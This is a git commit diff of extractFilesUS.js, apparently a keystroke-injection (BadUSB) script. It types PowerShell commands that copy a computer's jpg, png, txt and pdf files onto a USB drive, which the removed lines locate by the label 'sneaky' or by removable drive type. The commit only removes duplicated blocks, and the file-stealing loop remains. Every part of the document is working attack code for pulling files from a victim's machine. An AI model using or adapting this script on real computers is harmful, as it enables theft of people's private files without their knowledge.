f862767a6b14630c10be40b956d36eb35275b762
FuocomanSap <45140267+FuocomanSap@users.noreply.github.com>
2020-07-05 14:51:49 +0200

    Update extractFilesUS.js

--- extractFilesUS.js
+++ extractFilesUS.js
@@ -9,16 +9,5 @@ var filetypes = ["jpg", "png", "txt", "pdf"]
 for (var i = 0; i < filetypes.length; i++) {
     type("copy */*." + filetypes[i] + " $usbpath.name\n")
 }
-layout('it') //set layout us
-type("$usbPath = Get-WMIObject Win32_Volume | ? ( $_.Label -eq 'sneaky' ) | select name\n")
-for (var i = 0; i < filetypes.length; i++) {
-    type("copy */*." + filetypes[i] + " $usbpath.name\n")
-}
-layout('it')
-
-type("$usbPath = Get-WmiObject Win32_Volume -Filter DriveType='2' |select -expand driveletter\n")
-for (var i = 0; i < filetypes.length; i++) {
-    type("copy */*." + filetypes[i] + " $usbpath\n")
-}
 
 type("exit\n")  //exit
